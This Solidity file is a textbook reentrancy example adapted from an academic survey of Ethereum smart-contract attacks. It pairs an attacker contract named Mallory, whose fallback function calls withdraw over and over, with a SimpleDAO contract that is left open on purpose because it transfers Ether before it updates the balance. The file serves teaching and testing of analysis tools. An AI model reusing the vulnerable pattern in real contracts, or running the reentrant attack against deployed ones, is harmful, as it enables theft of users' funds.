/*
 * Example taken from the paper by N. Atzei, M. Bartoletti, and T. Cimoli, “A Survey of Attacks on Ethereum Smart Contracts (SoK),” in Principles of Security and Trust, 2017                                                                                 
 * http://blockchain.unica.it/projects/ethereum-survey/attacks.html#simpledao
 *
 * Modified for solidity 0.5 compatibility and removed unecessary
 * functions/variables.
 */

pragma solidity ^0.5.0;
// this code also works with older solidity
/*pragma solidity ^0.4.19;*/

contract Mallory {
    SimpleDAO public dao;
    address owner;

    function() payable external {
        dao.withdraw(dao.queryCredit(address(this)));
    }

    function setDAO(address addr) public {
        dao = SimpleDAO(addr);
    }
}

contract SimpleDAO {
    mapping (address => uint) public credit;

    function donate(address to) payable public {
        credit[to] += msg.value;
    }

    function withdraw(uint amount) public {
        if (credit[msg.sender] >= amount) {
            msg.sender.call.value(amount)("");
            credit[msg.sender] -= amount;
        }
    }

    function queryCredit(address to) public view returns (uint) {
        return credit[to];
    }
}
